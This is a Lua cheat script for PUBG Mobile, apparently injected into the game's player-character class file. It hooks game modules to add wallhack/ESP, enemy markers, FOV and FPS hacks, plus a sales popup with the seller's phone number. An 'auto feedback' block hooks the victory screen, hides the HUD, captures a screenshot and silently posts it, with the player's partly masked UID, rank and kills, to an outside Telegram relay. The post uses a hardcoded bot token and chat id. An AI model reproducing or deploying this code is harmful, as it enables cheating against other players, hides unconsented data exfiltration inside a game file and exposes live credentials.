        for i = 1, 8 do tiers[i] = {true, true} end
        if db then pcall(function() db:UpdateUIData(db.RealSupportFPS, tiers, false) end) end
        return tiers
      end
      impl.UpdateSelectedFPSState = function(self, level)
        if not Around(self.UIRoot) then return end
        local names = {[2]=20, [3]=25, [4]=30, [5]=40, [6]=60, [7]=90, [8]=120}
        for lvl = 2, 8 do
          local node = self.UIRoot["NodeFps" .. (names[lvl] or 120)]
          if Around(node) then
            node:SetIsEnabled(true)
            pcall(function() node:SetRenderOpacity(1.0) end)
            local switcher = self.UIRoot["WidgetSwitcher_" .. lvl]
            if Around(switcher) then switcher:SetActiveWidgetIndex(lvl == level and 0 or 1) end
          end
        end
      end
    end
  end)
  pcall(function()
    local ft = require("client.slua.umg.NewSetting.GraphicsNew.Comps.GSC_FPSFT")
    local db = require("client.slua.umg.NewSetting.GraphicsNew.GraphicSettingDB")
    local kmath = import("KismetMathLibrary") or _G.KismetMathLibrary
    local L = import("LinearColor") or _G.FLinearColor
    if ft and ft.__inner_impl then
      local impl = ft.__inner_impl
      local floorFps, step = 90, 5
      local function Pin(v, lo, hi)
        if v < lo then return lo end
        if hi < v then return hi end
        return v
      end
      local function BlendColor(a, b, t)
        if not L then return nil end
        return L(a.R + (b.R - a.R) * t, a.G + (b.G - a.G) * t, a.B + (b.B - a.B) * t, a.A + (b.A - a.A) * t)
      end
      impl.ShowOrHide = function(self)
        self:SelfHitTestInvisible()
        if self.InitFPSFTSwitch then self:InitFPSFTSwitch() end
      end
      impl.InitFPSFTSwitch = function(self)
        if not db then return end
        local on = db:GetUIData(db.FPSFineTuneSwitch)
        local root = self.UIRoot
        if root.Setting_Switch then root.Setting_Switch:SetSwitcherEnable2(on, true) end
        if root.CanvasPanel_8 then self:SetWidgetVisible(root.CanvasPanel_8, on) end
        if root.WidgetSwitcher_0 then root.WidgetSwitcher_0:SetActiveWidgetIndex(2) end
        if self.InitFPSFTValue165 then self:InitFPSFTValue165() end
      end
      impl.InitFPSFTValue165 = function(self)
        if not db then return end
        local root = self.UIRoot
        local on = db:GetUIData(db.FPSFineTuneSwitch)
        local value = 165
        if on then
          value = db:GetUIData(db.FPSFineTuneNum) or 165
          root.Slider_screen3:SetLocked(false)
          if L then
            root.ProgressBar_screen3:SetFillColorAndOpacity(L(1, 1, 1, 1))
            root.Slider_screen3:SetSliderHandleColor(L(1, 1, 1, 1))
          end
        else
          root.Slider_screen3:SetLocked(true)
          if L then
            root.ProgressBar_screen3:SetFillColorAndOpacity(L(1.0, 0.625, 0.6, 1))
            root.Slider_screen3:SetSliderHandleColor(L(1.0, 0.625, 0.6, 1))
          end
        end
        local ratio = (value - floorFps) / (165 - floorFps)
        root.Veihclescreen3:SetText(tostring(value))
        root.Slider_screen3:SetValue(ratio)
        root.ProgressBar_screen3:SetPercent(ratio)
        if L then
          local a = L(1, 1, 1, 1)
          local mid = L(1, 0.54, 0.11, 1)
          local z = L(1, 0.23, 0.15, 1)
          root.Slider_screen3:SetSliderHandleColor(ratio < 0.4 and a or BlendColor(mid, z, (ratio - 0.4) / 0.6))
        end
      end
      impl.OnFPSFTValueChange3 = function(self, fpsNum)
        db:UpdateUIData(db.FPSFineTuneNum, fpsNum)
        if self.InitFPSFTValue165 then self:InitFPSFTValue165() end
        if self:GetParentUI() then self:GetParentUI():SetDirty(true) end
        Gfx.PushFps(fpsNum)
      end
      impl.OnFPSFTSliderValueChange3 = function(self, value)
        if db:GetUIData(db.FPSFineTuneSwitch) and kmath then
          local fpsNum = kmath.FCeil(value * (165 - floorFps) / step) * step + floorFps
          self:OnFPSFTValueChange3(Pin(fpsNum, floorFps, 165))
        end
      end
      if impl.OnFPSFTAdd3 then impl.OnFPSFTAdd = impl.OnFPSFTAdd3 end
      if impl.OnFPSFTMinus3 then impl.OnFPSFTMinus = impl.OnFPSFTMinus3 end
      if impl.OnFPSFTAdd3 then impl.OnFPSFTAdd2 = impl.OnFPSFTAdd3 end
      if impl.OnFPSFTMinus3 then impl.OnFPSFTMinus2 = impl.OnFPSFTMinus3 end
      impl.OnFPSFTSliderValueChange = impl.OnFPSFTSliderValueChange3
      impl.OnFPSFTSliderValueChange2 = impl.OnFPSFTSliderValueChange3
    end
  end)
  A.Up.GfxReady = true
  OnScreen("165 FPS UNLOCKED")
end

local Menu = {}

function Menu.Wire()
  if A.Up.MenuWired then return end
  local loc = _G.LocUtil
  if not loc then
    local ok, m = pcall(require, "client.common.LocUtil")
    if ok and m then loc = m end
  end
  if not loc then
    local ok, m = pcall(require, "common.LocUtil")
    if ok and m then loc = m end
  end
  if loc and not loc._AegisLocHooked then
    local FakeText = {
      [999000] = "SAMEER MENU",
      [999001] = "Visuals (ESP)"
    }
    for _, fn in ipairs({"GetLocalizeResStr", "GetText", "GetTextByID", "GetLocalText", "GetLocalizeStr"}) do
      if loc[fn] then
        local old = loc[fn]
        loc[fn] = function(id, ...)
          if FakeText[id] then return FakeText[id] end
          if type(id) == "string" then
            if FakeText[tonumber(id)] then return FakeText[tonumber(id)] end
            if not tonumber(id) then return id end
          end
          if old then return old(id, ...) end
          return ""
        end
      end
    end
    loc._AegisLocHooked = true
  end
  local okPd, pageDef = pcall(require, "client.logic.NewSetting.SettingPageDefine")
  local okCat, catalog = pcall(require, "client.logic.NewSetting.SettingCatalog")
  if not okPd or not pageDef or not okCat or not catalog then return end
  if not pageDef.ModMenu then
    local okAlias, alias = pcall(require, "client.slua.umg.NewSetting.Item.AliasMap")
    if not okAlias or not alias then return end
    local stack = {
      { Key = "ModMenu_Wallhack", UI = alias.Switcher, Text = "Wallhack",
        GetFunc = function() return A.Config.Chams end,
        SetFunc = function(c, v) A.Config.Chams = v return true end },
      { Key = "ModMenu_WallVehicle", UI = alias.Switcher, Text = "Wallhack Vichel",
        GetFunc = function() return A.Config.WallVehicle end,
        SetFunc = function(c, v) A.Config.WallVehicle = v return true end },
   { Key = "ModMenu_Antenna", UI = alias.Switcher, Text = "Antenna",
        GetFunc = function() return A.Config.Antenna end,
        SetFunc = function(c, v) A.Config.Antenna = v return true end },
      { Key = "ModMenu_Meter", UI = alias.Switcher, Text = "Distance/Meter/Name",
        GetFunc = function() return A.Config.MeterMarks end,
        SetFunc = function(c, v) A.Config.MeterMarks = v return true end },
  { Key = "ModMenu_165FPS", UI = alias.Switcher, Text = "165FPS",
        GetFunc = function() return A.Config.HighFps end,
        SetFunc = function(c, v) A.Config.HighFps = v; A.Up.GfxReady = false return true end },
      { Key = "ModMenu_IpadView", UI = alias.TitleSwitcher, Text = "Ipad View", ExpandIndex = 0,
        GetFunc = function() return A.Config.Ipad end,
        SetFunc = function(c, v) A.Config.Ipad = v return true end },
      { Key = "ModMenu_IpadFOV", UI = alias.Slider, Text = "   Ipad FOV", ExpandHandle = "ModMenu_IpadView",
        MinValue = 1, MaxValue = 100, min = 1, max = 100,
        GetFunc = function() return (A.Config.IpadFov or 120) - 90 end,
        SetFunc = function(c, v) A.Config.IpadFov = 90 + v return true end },
   { Key = "ModMenu_Weapons", UI = alias.Switcher, Text = "Weapons",
        GetFunc = function() return A.Config.Weapons end,
        SetFunc = function(c, v) A.Config.Weapons = v return true end }
    }
    pageDef.ModMenu = {
      Key = "ModMenu", Text = 999000, UIKey = "Setting_Page_Privacy",
      Category = { { Key = "Cat_ESP", Text = 999001, Stack = stack } }
    }
    for i = #catalog, 1, -1 do
      if type(catalog[i]) == "table" and catalog[i].Key == "ModMenu" then table.remove(catalog, i) end
    end
    table.insert(catalog, 1, pageDef.ModMenu)
  end

  if _G.UIManager and not _G.UIManager._AegisUiHooked then
    local manager = _G.UIManager
    local base = manager.ShowUI
    manager.ShowUI = function(config, ...)
      local args = {...}
      local n = select("#", ...)
      if config and config.keyName then
        local low = string.lower(config.keyName)
        if string.find(low, "setting_main") and not string.find(low, "custom") then
          local list = args[1]
          if type(list) == "table" then
            for i = #list, 1, -1 do
              local page = list[i]
              if type(page) == "table" and page.Key == "ModMenu" then
                table.remove(list, i)
              end
            end
            table.insert(list, 1, pageDef.ModMenu)
          end
        end
      end
      local tUnpack = table.unpack or unpack
      return base(config, tUnpack(args, 1, n))
    end
    manager._AegisUiHooked = true
  end
  A.Up.MenuWired = true
end

function Menu.Announce()
  if A.Up.Announced then return end
  pcall(function()
    Menu.Wire()
    OnScreen("Mod Menu Added!\nOpen Settings (Gear icon) -> MR FAHAD  MENU.")
    A.Up.Announced = true
  end)
end

local MOKING = {}

function MOKING.ShowTopText()
  pcall(function()
    local sh = import("ScriptHelperClient")
    if sh and sh.AddOnScreenDebugMessage then
      sh.AddOnScreenDebugMessage("OWNER +92 [ 03704831068 ]", -1, 1.0, {R = 0, G = 1, B = 1, A = 1}, {X = 0.85, Y = 0.85})
    end
  end)
end

function MOKING.ShowWelcomePopup()
  if MOKING._popupShown then return end
  MOKING._popupShown = true
  pcall(function()
    local Msg = package.loaded["client.slua.logic.common.logic_common_msg_box"]
      or require("client.slua.logic.common.logic_common_msg_box")
    local Web = package.loaded["client.slua.logic.url.logic_webview_sdk"]
      or require("client.slua.logic.url.logic_webview_sdk")
    local function onJoin()
      if Web and Web.OpenURL then Web:OpenURL("https://Wa.me/+923704831068") end
    end
    local function onOK() end
    local title = "GRW_PREMIUM"
    local body  = "Magic bullets, Skin Changer, esp and many other features are available only on the Pro plan"
    local ok = pcall(function() Msg.Show(4, title, body, onJoin, onOK, "JOIN", "OK") end)
    if not ok then
      pcall(function() Msg.Show(4, title, body, onJoin) end)
    end
  end)
end

function MOKING.OnMatchEnter()
  if MOKING._matchEntered then return end
  MOKING._matchEntered = true
  MOKING.ShowTopText()
  MOKING.ShowWelcomePopup()
end

A.Up.Pulse = (A.Up.Pulse or 0) + 1
local myPulse = A.Up.Pulse
A.Up.TrackedMarks = A.Up.TrackedMarks or {}
A.Up.Targets = A.Up.Targets or {}

local function Beat()
  if not (_G.IsLicenseOK and _G.IsLicenseOK()) then return end
  if myPulse ~= A.Up.Pulse then return end

  pcall(function()
    if not A.Up.NativeReady and not A.Up.NativePriming then
      A.Up.NativePriming = true
      Esp.PrimeNativeMarks()
    end
    if A.Config.HighFps and not A.Up.GfxReady then Gfx.Unlock() end
  end)

  local okData, GameplayData = pcall(require, "GameLua.GameCore.Data.GameplayData")
  if not okData or not GameplayData then return end
  local pc = GameplayData.GetPlayerController()
  local me = nil
  if Around(pc) then me = pc:GetPlayerCharacterSafety() end

  if not Around(me) then
    for mark in pairs(A.Up.TrackedMarks) do LiftMark(mark) end
    for key, stamp in pairs(A.Up.Targets) do
      if stamp.enemy then StripMeshes(stamp.enemy, stamp) end
      A.Up.Targets[key] = nil
    end
    MOKING._matchEntered = false
    MOKING._popupShown = false
    return
  end

  Menu.Announce()
  MOKING.OnMatchEnter()
  MOKING.ShowTopText()

  if A.Config.WallVehicle then Vhc.WallScan(pc) else Vhc.StripAll() end

  if A.Config.Weapons then
    Weapons.Scan(pc)
    Weapons.Draw(pc)
  else
    A.Up.NearbyWeapons = {}
  end

  pcall(function()
    local cam = me.ThirdPersonCameraComponent
    if Around(cam) and not me.bIsWeaponAiming then
      local target = 90
      if A.Config.Ipad then target = A.Config.IpadFov or 120 end
      if cam.FieldOfView ~= target then cam.FieldOfView = target end
    end
  end)

  local squad = {}
  pcall(function()
    if GameplayData.GetAllPlayerCharacters then
      squad = GameplayData.GetAllPlayerCharacters() or {}
    end
  end)
  local myTeam = me.TeamID or 0

  local aliveKeys = {}
  for _, foe in pairs(squad) do
    if Around(foe) and foe ~= me then aliveKeys[EnemyId(foe)] = true end
  end
  for key, stamp in pairs(A.Up.Targets) do
    if not aliveKeys[key] then
      if stamp.enemy then
        StripMeshes(stamp.enemy, stamp)
        if stamp.healthMark then LiftMark(stamp.healthMark); stamp.healthMark = nil end
        if stamp.meterMark then LiftMark(stamp.meterMark); stamp.meterMark = nil end
      end
      A.Up.Targets[key] = nil
    end
  end

  for _, foe in pairs(squad) do
    if Around(foe) and foe ~= me and foe.TeamID ~= myTeam then
      local gone = false
      pcall(function() if foe.HealthStatus ~= nil and foe.HealthStatus == 2 then gone = true end end)
      local key = EnemyId(foe)
      A.Up.Targets[key] = A.Up.Targets[key] or { enemy = foe, IsBot = false }
      local stamp = A.Up.Targets[key]
      stamp.enemy = foe
      pcall(function()
        local isBot = foe.bIsBot or foe.bIsAI or foe.bIsDummy or false
        if not isBot then
          local pk = foe.PlayerKey
          if type(pk) == "number" and pk > 2000000000 then isBot = true end
        end
        if not isBot and type(foe.GetPlayerName) == "function" then
          local nm = foe:GetPlayerName() or ""
          local low = nm:lower()
          if low:find("bot", 1, true) or low:find("ai_", 1, true) or low:find("dummy", 1, true) or low:find("机器人", 1, true) or low:find("npc", 1, true) then
            isBot = true
          end
        end
        if not isBot then
          pcall(function()
            local ctrl = foe:GetController()
            if ctrl and ctrl.IsA then
              local AICtrl = import("AIController")
              if AICtrl and ctrl:IsA(AICtrl) then isBot = true end
            end
          end)
        end
        stamp.IsBot = isBot
      end)
      if not gone then
        if A.Config.Chams then ArmMeshes(foe, stamp) else StripMeshes(foe, stamp) end
        if A.Config.Antenna then DrawAntenna(me, foe, pc) end
        if A.Config.MeterMarks then
          if not stamp.healthMark then stamp.healthMark = PlaceMark(1006, {X=0,Y=0,Z=0}, 0, "", 4, foe) end
          if not stamp.meterMark then stamp.meterMark = PlaceMark(9999, {X=0,Y=0,Z=0}, 0, "", 4, foe) end
        else
          if stamp.healthMark then LiftMark(stamp.healthMark); stamp.healthMark = nil end
          if stamp.meterMark then LiftMark(stamp.meterMark); stamp.meterMark = nil end
        end
      else
        StripMeshes(foe, stamp)
        if stamp.healthMark then LiftMark(stamp.healthMark); stamp.healthMark = nil end
        if stamp.meterMark then LiftMark(stamp.meterMark); stamp.meterMark = nil end
      end
    end
  end
end

local function Pulse()
  if myPulse ~= A.Up.Pulse then return end
  pcall(Beat)
  local interval = 0.012
  if A.Up.Heartbeat and A.Up.Heartbeat > 0 then interval = A.Up.Heartbeat / 1000 end
  Later(interval, Pulse)
end

_G.__AegisStartAfterLicense = function()
  if not (_G.IsLicenseOK and _G.IsLicenseOK()) then return end
  pcall(function()
    local delay = math.random(150, 450) / 1000
    Later(delay, function()
      if _G.IsLicenseOK and _G.IsLicenseOK() then
        pcall(Shield.InstallAll)
      end
    end, true)
  end)
end

pcall(function()
  Later(2.0, Pulse, true)
end)

-- ============================================================
-- AUTO FEEDBACK SYSTEM (Telegram) - ALL RANKS SUPPORTED
-- ============================================================
local AutoFeedback = {
	Config = {
		ServerURL = "https://telegram-feedback.toolgrw.workers.dev/",
		TestMode = false
	},
	Hooked = false
}

local function AF_Log(message)
	print(string.format("[GRW_XD][%s] %s", os.date("%H:%M:%S"), tostring(message)))
end

local function AF_Notify(message)
	if _G.SRCHUBNotify then
		pcall(_G.SRCHUBNotify, message)
	end
end

local function AF_GetModule(name, allowRequire)
	local loaded = package and package.loaded and package.loaded[name]
	if loaded then return loaded end
	if allowRequire == false then return nil end
	local ok, module = pcall(require, name)
	if ok then return module end
	return nil
end

local function AF_AddTimerOnce(delay, callback)
	local ticker = AF_GetModule("common.time_ticker")
	if ticker and type(ticker.AddTimerOnce) == "function" then
		ticker.AddTimerOnce(delay, callback)
		return true
	end
	return false
end

local function AF_Base64Encode(data)
	if type(data) ~= "string" or #data == 0 then return "" end
	local alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
	local output = {}
	local outputIndex = 0
	local index = 1
	while index <= #data - 2 do
		local a, b, c = string.byte(data, index, index + 2)
		local value = a * 65536 + b * 256 + c
		outputIndex = outputIndex + 1
		output[outputIndex] = string.char(
			string.byte(alphabet, math.floor(value / 262144) + 1),
			string.byte(alphabet, math.floor(value / 4096) % 64 + 1),
			string.byte(alphabet, math.floor(value / 64) % 64 + 1),
			string.byte(alphabet, value % 64 + 1)
		)
		index = index + 3
	end
	local remaining = #data - index + 1
	if remaining == 2 then
		local a, b = string.byte(data, index, index + 1)
		local value = a * 65536 + b * 256
		outputIndex = outputIndex + 1
		output[outputIndex] = string.char(
			string.byte(alphabet, math.floor(value / 262144) + 1),
			string.byte(alphabet, math.floor(value / 4096) % 64 + 1),
			string.byte(alphabet, math.floor(value / 64) % 64 + 1),
			string.byte("=")
		)
	elseif remaining == 1 then
		local value = string.byte(data, index) * 65536
		outputIndex = outputIndex + 1
		output[outputIndex] = string.char(
			string.byte(alphabet, math.floor(value / 262144) + 1),
			string.byte(alphabet, math.floor(value / 4096) % 64 + 1),
			string.byte("="),
			string.byte("=")
		)
	end
	return table.concat(output)
end

local function AF_UrlEncode(value)
	if value == nil then return nil end
	value = tostring(value):gsub("\n", "\r\n")
	value = value:gsub("([^A-Za-z0-9 %-%_%.%~])", function(character)
		return string.format("%%%02X", string.byte(character))
	end)
	value = value:gsub(" ", "+")
	return value
end

local function AF_ReadFile(path)
	local file = io.open(path, "rb")
	if not file then return "" end
	local data = file:read("*a") or ""
	file:close()
	return data
end

local function AF_RemoveFile(path)
	pcall(os.remove, path)
end

local function AF_GetRankName(rank)
	if rank < 1700 then return "Bronze"
	elseif rank < 2200 then return "Silver"
	elseif rank < 2700 then return "Gold"
	elseif rank < 3200 then return "Platinum"
	elseif rank < 3700 then return "Diamond"
	elseif rank < 4200 then return "Crown"
	elseif rank < 4700 then return "Ace"
	elseif rank < 5200 then return "Ace Master"
	elseif rank < 5600 then return "Ace Dominator"
	end
	return "Conqueror"
end

local FeedbackCaptionTemplate = "<b>OWNER_+92 [ 03704831068 ]</b>\n<pre>\nPlayer - %s\nUID    - %s\nTime   - %s\nKills  - %d\nRank   - %s\n</pre>\n[ ACTIVE - SAFE ]\n<b>Owner: @GRW_XD</b>"

function AutoFeedback.SendFeedback(path, kills, rank, segment)
	AF_Log("Preparing to send feedback. Screenshot: " .. tostring(path))
	local ok, err = pcall(function()
		local httpManager = AF_GetModule("client.slua.logic.http.http_manager")
		if not httpManager or type(httpManager.Post) ~= "function" then
			AF_Log("HTTP manager is unavailable.")
			return
		end
		local attempts = 0
		local function TrySend()
			local imageData = AF_ReadFile(path)
			if #imageData > 0 then
				local uid = "unknown"
				if _G.DataMgr and _G.DataMgr.roleData and _G.DataMgr.roleData.uid then
					uid = tostring(_G.DataMgr.roleData.uid)
				elseif _G._KONG_UK then
					uid = tostring(_G._KONG_UK)
				end
				kills = tonumber(kills) or 0
				rank = tonumber(rank) or 0
				segment = tonumber(segment) or 0
				local maskedName = "*****"
				local maskedUid = "***"
				if uid ~= "unknown" and #uid > 5 then
					maskedUid = uid:sub(1, 3) .. "***" .. uid:sub(-2)
				end
				local caption = string.format(
					FeedbackCaptionTemplate,
					maskedName,
					maskedUid,
					os.date("%H:%M:%S %d/%m/%Y"),
					kills,
					AF_GetRankName(rank)
				)
				local encodedImage = AF_Base64Encode(imageData)
				encodedImage = encodedImage:gsub("%+", "%%2B")
				encodedImage = encodedImage:gsub("/", "%%2F")
				encodedImage = encodedImage:gsub("=", "%%3D")
				AF_Notify("[SRC_HUB] Uploading Top 1 screenshot to VIP Server...")
				local body = "base64_image=" .. encodedImage
					.. "&caption=" .. AF_UrlEncode(caption)
					.. "&bot_token=" .. AF_UrlEncode("8582577497:AAEJVQNMMv1r8l_LrYWvCVIBgXTEEDgZO2w")
					.. "&chat_id=" .. AF_UrlEncode("7435734062")
				httpManager:Post(
					AutoFeedback.Config.ServerURL,
					{["Content-Type"] = "application/x-www-form-urlencoded"},
					body,
					nil,
					function(success, _, response, errorMessage)
						if success and response and tostring(response):find('"status":%s*true') then
							AF_Notify("[SRC_HUB] Successfully sent! (Kills: " .. tostring(kills) .. ")")
						else
							local detail = tostring(response or errorMessage):sub(1, 40)
							AF_Notify("[SRC_HUB] VIP Server error: " .. detail)
						end
						AF_RemoveFile(path)
					end,
					60
				)
				return
			end
			attempts = attempts + 1
			if attempts < 5 and AF_AddTimerOnce(1.0, TrySend) then
				return
			end
			AF_Notify("[SRC_HUB] Screenshot capture failed!")
			AF_RemoveFile(path)
		end
		TrySend()
	end)
	if not ok then
		AF_Log("SendFeedback Error: " .. tostring(err))
	end
end

local AF_HudNames = {
	"BattleChat_UIBP","Chat_UIBP","ChatMsg_UIBP","TeamAvatar_UIBP","Team_UIBP",
	"VoiceChat_UIBP","MiniMap_UIBP","Bag_UIBP","PickUp_UIBP","PickUpList_UIBP",
	"SystemChat_UIBP","InGameChat_UIBP","InGameChatPanel_UIBP","KillFeed_UIBP",
	"Elimination_UIBP","ChatHUD_UIBP","ChatPanel_UIBP","MainHUD_UIBP","BattleHUD_UIBP"
}

local function AF_GetRankAndSegment()
	local rank = 0
	local segment = 0
	pcall(function()
		local battleResult = _G.BP_STRUCT_BattleResultData
		local rating = battleResult and (battleResult.rating or battleResult.BP_STRUCT_BTRating)
		if rating then
			rank = tonumber(rating.rank_rating) or 0
			segment = tonumber(rating.new_segment) or 0
		end
		if rank == 0 then
			local funcUtil = AF_GetModule("common.func_util")
			local roleData = _G.DataMgr and _G.DataMgr.roleData
			if funcUtil and type(funcUtil.GetCurMaxSegementLevel) == "function"
				and roleData and roleData.allzoneSegment then
				segment = tonumber(funcUtil.GetCurMaxSegementLevel(roleData.allzoneSegment)) or 0
			end
			if roleData and roleData.segment_rating then
				for _, value in pairs(roleData.segment_rating) do
					if type(value) == "table" then
						for _, nestedValue in pairs(value) do
							if type(nestedValue) == "number" and nestedValue > rank then
								rank = nestedValue
							end
						end
					elseif type(value) == "number" and value > rank then
						rank = value
					end
				end
			end
		end
	end)
	return rank, segment
end

local function AF_CreateHudController()
	local hidden = {}
	local function SetHidden(hide)
		local UIManager = _G.UIManager
		if not UIManager then return end
		if hide then
			for _, name in ipairs(AF_HudNames) do
				local config
				if UIManager.UI_Config_InGame and UIManager.UI_Config_InGame[name] then
					config = UIManager.UI_Config_InGame[name]
				elseif UIManager.UI_Config and UIManager.UI_Config[name] then
					config = UIManager.UI_Config[name]
				end
				if config then
					local view = type(UIManager.GetUI) == "function" and UIManager.GetUI(config) or nil
					if view then
						pcall(function()
							if type(view.SetVisibility) == "function" then
								view:SetVisibility(2)
							elseif view.UIRoot and type(view.UIRoot.SetVisibility) == "function" then
								view.UIRoot:SetVisibility(2)
							elseif type(UIManager.HideUI) == "function" then
								UIManager.HideUI(config)
							elseif type(UIManager.CloseUI) == "function" then
								UIManager.CloseUI(config)
							end
						end)
						table.insert(hidden, {config = config, view = view})
					end
				end
			end
			return
		end
		for _, item in ipairs(hidden) do
			pcall(function()
				if item.view and type(item.view.SetVisibility) == "function" then
					item.view:SetVisibility(0)
				elseif item.view and item.view.UIRoot and type(item.view.UIRoot.SetVisibility) == "function" then
					item.view.UIRoot:SetVisibility(0)
				elseif type(UIManager.ShowUI) == "function" then
					UIManager.ShowUI(item.config)
				end
			end)
		end
		hidden = {}
	end
	return SetHidden
end

local function AF_GetScreenshotDirectory()
	local directories = {}
	local home = os.getenv("HOME")
	if home and home ~= "" then
		table.insert(directories, home .. "/Documents/ShadowTrackerExtra/Saved/")
	end
	local packages = {"com.tencent.ig","com.vng.pubgmobile","com.pubg.krmobile","com.rekoo.pubgm","com.pubg.imobile"}
	for _, packageName in ipairs(packages) do
		table.insert(directories,
			"/storage/emulated/0/Android/data/" .. packageName
			.. "/files/UE4Game/ShadowTrackerExtra/ShadowTrackerExtra/Saved/")
	end
	local selected = directories[1]
	for _, directory in ipairs(directories) do
		local testPath = directory .. "t.tmp"
		local file = io.open(testPath, "w")
		if file then
			file:close()
			os.remove(testPath)
			selected = directory
			break
		end
	end
	return selected
end

local function AF_CaptureAndSend(kills, rank, segment, restoreHud)
	local restored = false
	local function RestoreHudOnce()
		if not restored then
			restored = true
			restoreHud(false)
		end
	end
	local ScreenshotMaker = import("ScreenshotMaker")
	if not ScreenshotMaker then RestoreHudOnce(); return end
	local directory = AF_GetScreenshotDirectory()
	if not directory then RestoreHudOnce(); return end
	local path = directory .. string.format("kongwin_%s.jpg", os.time())
	local uiUtil = AF_GetModule("client.common.ui_util")
	local gameInstance = uiUtil and uiUtil.GetGameInstance and uiUtil.GetGameInstance()
	local enginePreTick = gameInstance and gameInstance.EnginePreTick
	if not enginePreTick or type(enginePreTick.Add) ~= "function" then
		RestoreHudOnce(); return
	end
	local ticker = AF_GetModule("common.time_ticker")
	if not ticker or type(ticker.AddTimerOnce) ~= "function" then
		RestoreHudOnce(); return
	end
	enginePreTick:Add(function()
		local actualPath = ScreenshotMaker.MakePictureByName(path, true)
		if type(enginePreTick.Clear) == "function" then enginePreTick:Clear() end
		if actualPath and actualPath ~= "" then path = actualPath end
		local attempts = 0
		local function CheckCapture()
			attempts = attempts + 1
			local captured = false
			pcall(function() captured = ScreenshotMaker.HasCaptured(path) end)
			if captured then
				RestoreHudOnce()
				AF_Log("HasCaptured=true. Flushing to disk via ResizePicture...")
				pcall(ScreenshotMaker.ResizePicture, path, 0.9, path)
				ticker.AddTimerOnce(2.0, function()
					if #AF_ReadFile(path) > 0 then
						AutoFeedback.SendFeedback(path, kills, rank, segment)
					else
						AF_Notify("[SRC_HUB] iOS image read error!")
					end
				end)
			elseif attempts < 15 then
				ticker.AddTimerOnce(1, CheckCapture)
			else
				RestoreHudOnce()
				AF_Notify("[SRC_HUB] Screenshot capture failed!")
			end
		end
		ticker.AddTimerOnce(1, CheckCapture)
	end)
end

function AutoFeedback.ProcessWin(kills)
	kills = tonumber(kills) or 0
	local rank, segment = AF_GetRankAndSegment()
	-- ✅ ALL RANKS SUPPORTED - Sirf kills check (kills > 0)
	if kills <= 0 then
		AF_Log(string.format("Skipping feedback: Kill %d (Requires Kill > 0)", kills))
		return
	end
	AF_Notify("[SRC_HUB] Congratulations on getting TOP 1! Rank: " .. AF_GetRankName(rank))
	local setHudHidden = AF_CreateHudController()
	setHudHidden(true)
	local ok, err = pcall(AF_CaptureAndSend, kills, rank, segment, setHudHidden)
	if not ok then
		setHudHidden(false)
		AF_Log("ProcessWin Error: " .. tostring(err))
	end
end

local function AF_GetWinnerKills()
	local kills = 0
	pcall(function()
		local likeUtil = AF_GetModule("GameLua.Mod.BaseMod.Client.Like.IngameLikeUtilClient")
		if likeUtil and type(likeUtil.GetMyPlayerState) == "function" then
			local playerState = likeUtil.GetMyPlayerState()
			if playerState and playerState.Kills then
				kills = tonumber(playerState.Kills) or 0
			end
		end
		if kills == 0 then
			local resultLogic = AF_GetModule(
				"GameLua.Mod.BaseMod.Client.BattleResult.BattleResultData.BattleResultDataLogic",
				false
			)
			if resultLogic and type(resultLogic.GetBattleResultData) == "function" then
				local result = resultLogic:GetBattleResultData()
				if result and result.BP_mykill then
					kills = tonumber(result.BP_mykill) or 0
				end
			end
		end
	end)
	return kills
end

local function AF_TryInstallHook()
	pcall(function()
		local UIManager = _G.UIManager
		if not UIManager or not UIManager.ShowUI then return end
		if UIManager.__SRCHUBHooked then
			UIManager.__SRCHUBHooked = false
		end
		AF_Log("Hooking UIManager.ShowUI for in-game Winner UI...")
		local originalShowUI = UIManager.ShowUI
		UIManager.ShowUI = function(config, params, ...)
			local result = originalShowUI(config, params, ...)
			pcall(function()
				-- ✅ STRONG WINNER DETECTION - Chicken Dinner Fix
				if not params then return end

				local isWinner = params.Reason == "win"
					or params.ShowedWinLogo == true
					or params.IsWin == true
					or params.IsWinner == true
					or params.bWin == true
					or params.Win == true

				if not isWinner then return end

				local kills = AF_GetWinnerKills()
				if not AF_AddTimerOnce(2, function() AutoFeedback.ProcessWin(kills) end) then
					AutoFeedback.ProcessWin(kills)
				end
			end)
			return result
		end
		-- UIManager.__SRCHUBHooked = true
		AF_Log("UIManager Hook installed successfully.")
	end)
end

function AutoFeedback.Install()
	AF_Log("Installing Pro system (Telegram)...")
	if AutoFeedback.Config.TestMode then
		pcall(function()
			AF_AddTimerOnce(5.0, function() AutoFeedback.ProcessWin() end)
		end)
	end
	pcall(function()
		local ticker = AF_GetModule("common.time_ticker")
		if ticker and type(ticker.AddTimer) == "function" then
			ticker.AddTimer(3.0, AF_TryInstallHook)
		else
			AF_TryInstallHook()
		end
	end)
end

_G.GODxRJ_AutoFeedbackRecovered = AutoFeedback
AutoFeedback.Install()
-- ============================================================
-- END AUTO FEEDBACK SYSTEM
-- ============================================================


local class = require("class")
local CCharacterBase = require("GameLua.GameCore.Framework.CharacterBase")
local CBRPlayerCharacterBase = class(CCharacterBase, nil, BRPlayerCharacterBase)
return require("combine_class").DeclareFeature(CBRPlayerCharacterBase, {
  {
    SkyTransition = "GameLua.Mod.BaseMod.Gameplay.Feature.SkyControl.PlayerCharacterSkyTransitionFeature"
  },
  {
    CarryDeadBoxFeature = "GameLua.Mod.Library.GamePlay.Feature.CarryDeadBoxFeature"
  },
  {
    SpecialSuitFeature = "GameLua.Mod.Library.GamePlay.Feature.SpecialSuitFeature"
  },
  {
    TeleportPawnFeature = "GameLua.Mod.Library.GamePlay.Feature.TeleportPawnFeature"
  },
  {
    LifterControl = "GameLua.Mod.BaseMod.Gameplay.Feature.Player.CharacterLifterControlFeature"
  },
  {
    FinalKillEffect = "GameLua.Mod.BaseMod.Gameplay.Feature.Player.PlayerCharacterFinalKillEffectFeature"
  },
  {
    CampFeature = "GameLua.Mod.BaseMod.GamePlay.Feature.Camp.PlayerCharacterCampFeature"
  },
  {
    BuildAircraftVehicleFeature = "GameLua.Mod.BaseMod.GamePlay.Feature.PlayerCharacterBuildVehicleFeature"
  },
  {
    UnifiedBuildVehicleFeature = "GameLua.Mod.BaseMod.GamePlay.Feature.UnifiedBuildVehicleFeature"
  },
  {
    CommonBornlandTransformFeature = "GameLua.Mod.BaseMod.GamePlay.Feature.HeroPropFeature.CommonBornlandTransformFeature"
  },
  {
    ParachuteFormation = "GameLua.Mod.BaseMod.GamePlay.Feature.ParachuteFormationFeature"
  },
  {
